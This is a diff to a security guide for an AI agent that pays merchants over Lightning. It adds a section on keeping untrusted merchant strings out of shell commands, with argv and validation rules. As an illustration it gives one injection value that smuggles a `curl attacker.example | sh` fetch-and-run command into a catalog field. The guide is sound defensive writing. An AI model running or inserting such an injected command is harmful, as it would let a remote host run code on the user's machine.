@@ -64,6 +64,19 @@ Default `toleranceBps` is 200 (2%); a merchant doc may widen it with a reason (e
 
 **How strong this guard actually is.** Against a single tampered response it is strong. Against a **compromised channel** it is not: `quotedSats` and the invoice arrive from the same host, so an attacker who controls the merchant endpoint (or TLS/DNS) quotes and invoices consistently, and the hash binding proves only self-consistency. What survives channel compromise is `maxAmountSats` alone — so set it from the user's actual budget on every call and never leave it at a default you didn't choose.
 
+## 1a. Untrusted strings never reach a shell as text
+
+The checkout response is untrusted (§1) — and so is every other string a merchant, a directory, or a paywall hands back: product ids, denominations, cart JSON, URLs, header names, order ids, redemption codes. The shipped code in this repo never shells out, so the only place these can become a *command* is when **you** compose one — in a Bash tool, a `curl`, a one-line "verify" you invent on the spot. That is a shell-injection surface: a catalog value shaped like `x'; curl attacker.example | sh; '` runs if it is interpolated into a shell line. Low likelihood on a merchant's own TLS API; total impact; ten seconds to avoid.
+
+Rules, in order of preference:
+
+1. **Prefer the merchant's MCP tools or a JS call over its CLI when both exist.** Structured arguments never touch a shell. (Bitrefill and Cryptorefills both offer MCP; the CLI is the fallback.)
+2. **When a CLI is the path, pass merchant strings as argv, never as shell text.** From JS: `execFile("bitrefill", ["buy-products", "--cart_items", cartJson, "--email", email])` — an array, no `exec(\`… ${id} …\`)`. From a Bash tool where you must write a line: **validate first** — a product id must match `^[A-Za-z0-9._-]+$`, an amount must be a number, a URL must parse as `https://` with a plain host — then single-quote every value. Anything that fails validation is a refusal, not an escape attempt.
+3. **JSON goes through a file, not a quoted string.** Write cart/order JSON with `writeFile` and pass the path (or pipe it on stdin) where the CLI supports it; if it only takes an inline argument, build the JSON with `JSON.stringify` from validated fields, never by concatenation.
+4. **Never `eval`, `sh -c`, or backtick a string that contains a merchant value**, and never `echo` a redemption code into a shell pipeline "to save it" — that puts a bearer secret in shell history and process lists (§4).
+
+The same applies to a `curl` against a URL that came from a directory listing (`references/l402.md`): check it parses and starts with `https://` before it is an argument to anything.
+
 ## 2. Know what actually bounds this spend (mostly: nothing)
 
 The recipient allowlist (`~/.spark/recipients.allow`) **cannot see Lightning** — merchant checkouts pay a node embedded in a BOLT11, not an address. Through the `SparkAgent` wrapper, two things do bound merchant spend: the per-call `maxAmountSats` ceiling (§1) and the **cumulative `SPARK_DAILY_BUDGET_SATS` budget** (rolling 24h, enforced by `lib/spend-ledger.js` across all sats paths) — the latter is what stops a *loop* of individually-valid purchases. Both live in the agent's own process: they bound mistakes and runaway loops, not a compromised process calling the raw SDK, which skips all of it. No control here survives full process compromise — the funded balance is the only spending authority that does, so when merchant spending is routine, keep the wallet at an operational float and top it up rather than parking a large balance.
